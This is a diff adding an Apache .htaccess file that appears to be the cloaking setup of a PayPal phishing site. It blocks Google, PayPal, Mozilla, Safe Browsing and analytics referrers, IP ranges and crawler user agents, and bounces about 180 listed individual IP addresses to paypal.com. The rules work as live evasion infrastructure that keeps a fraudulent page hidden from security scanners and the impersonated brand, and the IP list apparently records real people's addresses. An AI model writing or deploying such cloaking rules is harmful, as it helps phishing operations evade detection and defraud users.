@@ -1,0 +1,796 @@
+RewriteEngine on
+# Options +FollowSymlinks
+RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} google\.com
+RewriteCond %{HTTP_REFERER} paypal\.com
+RewriteCond %{HTTP_REFERER} firefox\.com
+RewriteRule .* - [F]
+RewriteCond %{HTTP_USER_AGENT} ^googlebot [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^BlackWidow [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^ChinaClaw [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Custo [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^DISCo [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Download\ Demon [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^eCatch [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EirGrabber [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EmailSiphon [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EmailWolf [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Express\ WebPictures [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^ExtractorPro [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^EyeNetIE [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^FlashGet [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^GetRight [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^GetWeb! [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Go!Zilla [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Go-Ahead-Got-It [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^GrabNet [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Grafula [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^HMView [OR] 
+RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR] 
+RewriteCond %{HTTP_USER_AGENT} Indy\ Library [NC,OR] 
+RewriteCond %{HTTP_USER_AGENT} ^InterGET [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Internet\ Ninja [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^JetCar [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^JOC\ Web\ Spider [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^larbin [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^LeechFTP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Mass\ Downloader [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^MIDown\ tool [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Mister\ PiX [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Navroad [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NearSite [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NetAnts [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NetSpider [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Net\ Vampire [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^NetZIP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Octopus [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Offline\ Explorer [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Offline\ Navigator [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^PageGrabber [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Papa\ Foto [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^pavuk [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^pcBrowser [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^RealDownload [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^ReGet [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SiteSnagger [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SmartDownload [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SuperBot [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^SuperHTTP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Surfbot [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^tAkeOut [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Teleport\ Pro [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^VoidEYE [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Web\ Image\ Collector [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Web\ Sucker [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebAuto [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebCopier [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebFetch [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebGo\ IS [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebLeacher [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebReaper [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebSauger [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Website\ eXtractor [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Website\ Quester [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebStripper [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebWhacker [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WebZIP [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Wget [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Widow [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^WWWOFFLE [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Xaldon\ WebSpider [OR] 
+RewriteCond %{HTTP_USER_AGENT} ^Zeus 
+RewriteRule ^.* - [F,L]
+RewriteEngine on
+RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://safebrowsing-cache.google.com/.*$ [NC]
+RewriteRule .* - [F,L]
+
+Options -Indexes
+order allow,deny
+deny from 89.207.18.182/22
+deny from 173.194.69.147/22
+deny from 149.3.176.145/22
+deny from 66.235.156.128/22
+deny from 173.194.69.125/22
+deny from 173.194.69.120/22
+deny from 173.194.69.102/22
+deny from 173.194.69.95/22
+deny from 173.194.69.94/22
+deny from 173.194.69.91/22
+deny from 173.0.88.2/22
+deny from 173.0.84.2/22
+deny from 173.0.84.34/22
+deny from 173.0.88.2/22
+deny from 173.0.88.34/22
+deny from 2.20.6.85/22
+deny from 63.245.213.92/22
+deny from 173.194.69.106/22
+deny from 173.194.69.147/22
+deny from 173.194.69.99/22
+deny from 173.194.69.103/22
+deny from 173.194.69.104/22
+deny from 173.194.69.105/22
+deny from 173.194.69.94/22
+deny from 173.194.69.106/22
+deny from 173.194.69.147/22
+deny from 173.194.69.99/22
+deny from 173.194.69.103/22
+deny from 173.194.69.104/22
+deny from 173.194.69.105/22
+deny from 173.194.69.94/22
+deny from 63.245.213.92/22
+deny from 63.245.217.20/22
+deny from 64.62.203.172/22
+deny from 173.194.69.102/22
+deny from 173.194.69.113/22
+deny from 173.194.69.138/22
+deny from 173.194.69.139/22
+deny from 173.194.69.100/22
+deny from 173.194.69.101/22
+deny from 64.62.203.172/22
+deny from 63.245.217.71/22
+deny from 188.112.175.207/22
+deny from 66.235.139.166/22
+deny from 66.235.138.2/22
+deny from 66.235.138.59/22
+deny from 66.235.139.153/22
+deny from 66.235.139.152/22
+deny from 66.235.138.44/22
+deny from 66.235.139.118/22
+deny from 66.235.138.18/22
+deny from 66.235.139.121/22
+deny from 66.235.138.19/22
+deny from 66.235.134.160/22
+deny from 66.235.133.8/22
+deny from 66.235.133.52/22
+deny from 66.235.133.33/22
+deny from 66.235.132.152/22
+deny from 66.235.133.62/22
+deny from 66.235.132.232/22
+deny from 66.235.132.118/22
+deny from 66.235.133.11/22
+deny from 66.235.132.121/22
+deny from 149.20.57.227
+deny from 199.48.147.36
+deny from 37.59.162.218
+deny from 89.122.57.201
+deny from 69.163.205.29
+deny from 74.120.15.150
+deny from 109.163.233.200
+deny from 79.120.86.20
+deny from 31.172.30.4
+deny from 109.65.136.19
+deny from 66.150.14.185
+deny from 50.97.98.130
+deny from 66.150.14.185
+deny from 80.237.226.73
+deny from 64.34.184.153
+deny from 66.230.230.230
+deny from 71.165.245.158
+deny from 74.120.15.150
+deny from 76.73.56.7
+deny from 77.109.139.87
+deny from 81.218.219.122
+deny from 83.86.110.188
+deny from 83.142.228.14
+deny from 83.249.87.238
+deny from 85.17.92.13
+deny from 85.235.31.248
+deny from 87.118.104.203
+deny from 88.80.28.70
+deny from 88.208.121.151
+deny from 89.253.97.235
+deny from 91.121.170.32
+deny from 94.249.153.47
+deny from 95.143.193.145
+deny from 109.169.29.56
+deny from 109.123.119.163
+deny from 137.56.163.46
+deny from 137.56.163.64
+deny from 173.193.221.28
+deny from 192.251.226.205
+deny from 192.251.226.206
+deny from 199.48.147.35
+deny from 199.48.147.36
+deny from 199.48.147.38
+deny from 199.48.147.40
+deny from 199.48.147.41
+deny from 208.66.135.190
+deny from 209.44.114.178
+deny from 209.159.142.164
+deny from 209.159.143.130
+deny from 213.220.233.230
+deny from 8.18.38.105 
+deny from 62.141.58.13
+deny from 62.163.180.154
+deny from 77.171.107.207
+deny from 78.47.251.152   
+deny from 81.169.155.246
+deny from 82.194.86.135
+deny from 83.163.192.49
+deny from 91.121.152.114 
+deny from 91.213.50.235
+deny from 93.167.245.178 
+deny from 94.23.215.184
+deny from 174.138.169.218
+deny from 64.34.162.160 
+deny from 66.249.9.107   
+deny from 66.96.16.32 
+deny from 78.107.233.68
+deny from 78.107.237.16
+deny from 83.170.92.9   
+deny from 85.214.73.63 
+deny from 91.124.187.225 
+deny from 194.0.229.54
+deny from 195.43.157.85 
+deny from 212.78.238.92 
+deny from 217.114.211.20  
+deny from 62.24.222.132
+deny from 62.24.222.131
+deny from 66.235.133.14/22
+deny from google.com
+deny from paypal.com
+deny from 112.2o7.com
+deny from firefox.com
+deny from apple.com
+deny from env=stealthed
+allow from all
+
+
+
+RewriteEngine On
+RewriteCond %{REMOTE_ADDR} ^82.20.255.107$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^76.14.85.24$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^93.40.130.78$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.121.190.252$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^23.242.68.213$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.223.224.69$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^80.229.105.197$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^80.254.147.172$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^77.101.127.41$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.54.115.146$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^95.226.168.197$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^5.69.136.148$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.171.70.64$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.129.125.226$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^213.107.231.88$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.146.245.57$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^31.53.224.194$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^120.148.12.43$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^94.194.178.112$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.204.228.241$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^88.105.240.73$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.121.21.64$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^80.0.148.21$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.54.154.72$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.229.112.124$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^80.6.237.96$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.121.49.127$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^62.253.57.202$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^81.152.78.229$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^94.14.118.204$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.209.39.146$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.165.5.137$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.192.253.68$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^81.156.252.14$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^146.199.47.198$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^77.98.237.164$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.217.140.26$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.227.39.177$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.203.109.12$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^31.52.145.193$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.251.0.99$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.230.38.140$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^107.77.75.109$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^149.88.2.145$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^184.179.23.226$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^135.19.218.241$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^49.219.158.113$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^103.252.200.250$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^71.171.83.6$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^175.136.232.227$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^79.144.136.116$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^115.84.150.92$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^81.61.46.78$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.84.114.70$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^88.149.210.40$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^89.101.249.51$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^93.34.226.73$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^88.105.22.66$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.51.42.94$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^77.99.151.7$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.125.57.146$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.216.213.197$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^91.84.84.220$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.128.34.205$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.244.156.143$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.16.187.65$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^109.234.204.162$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.175.99.122$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^93.149.240.89$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^210.1.192.157$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^92.4.67.57$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.142.127.71$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^180.245.160.222$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.217.237.165$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^128.199.243.158$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^125.164.221.196$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^43.224.32.4$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.32.147.131$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^188.82.164.38$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^62.108.225.74$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^93.45.174.233$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^79.12.43.76$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^93.46.146.187$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.29.205.42$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^178.162.209.102$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^104.207.136.15$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^74.67.56.132$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.73.34.28$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^87.20.207.80$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^90.210.204.191$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^79.54.139.160$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^78.150.230.68$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^79.9.75.66$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.21.113.103$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.58.95.242$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.53.106.11$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^109.147.115.64$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^151.64.28.198$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.52.96.136$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^110.77.136.54$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^93.147.178.223$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^212.195.233.226$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^50.247.22.220$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^216.232.97.55$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^105.235.106.219$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^80.111.42.18$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^2.33.107.202$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^202.62.17.23$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^122.151.70.29$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.21.213.219$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^95.45.74.65$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^93.150.226.78$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^92.251.204.29$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^105.139.242.211$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^73.16.208.33$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.128.105.209$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^87.242.250.213$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^81.151.255.71$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^121.219.129.58$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.158.249.242$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^62.31.117.211$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.31.133.32$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^184.152.74.1$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^75.82.228.129$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^1.136.97.49$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^109.151.40.215$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^101.171.170.155$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.133.177.214$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.132.238.244$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^86.154.126.10$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^85.211.136.53$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^49.197.30.124$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^58.168.49.151$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^101.170.85.75$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^108.33.10.53$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^74.70.203.139$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^47.18.197.174$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^70.215.192.151$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^46.9.59.38$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^70.195.7.233$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^73.45.216.5$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.114.53.77$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^67.242.201.60$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^74.36.132.164$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^82.132.227.107$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^70.193.35.251$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^94.197.121.6$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^166.137.139.23$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^166.137.244.59$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.162.197.144$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^116.254.102.111$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^156.34.152.164$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^142.166.170.254$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^142.167.183.50$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^216.232.163.226$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^173.237.108.16$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^50.101.37.33$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^96.30.168.31$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^174.115.25.102$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.249.149.211$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^75.156.98.97$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^208.123.223.64$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^114.121.237.242$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^202.62.16.20$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^114.124.33.21$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.52.237.241$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^142.169.78.65$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.114.81.252$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^216.58.22.229$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.241.182.73$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^24.114.68.86$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.240.211.218$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^139.57.217.148$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^99.232.120.45$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^184.144.215.186$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^69.58.104.32$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^142.177.113.231$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^74.114.172.130$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^130.15.33.142$
+RewriteRule .* https://www.paypal.com [R,L]
+RewriteCond %{REMOTE_ADDR} ^70.48.196.209$
+RewriteRule .* https://www.paypal.com [R,L]
